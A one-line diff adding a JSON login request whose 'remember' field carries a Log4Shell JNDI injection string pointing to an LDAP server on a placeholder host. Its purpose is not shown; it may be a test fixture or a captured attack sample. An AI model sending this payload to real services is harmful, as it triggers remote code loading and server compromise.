@@ -1,0 +1,1 @@
+{"username":"asdf","password":"asdfas","remember":"${jndi:ldap://ip_mu:1389/2slapb}","strict":true}
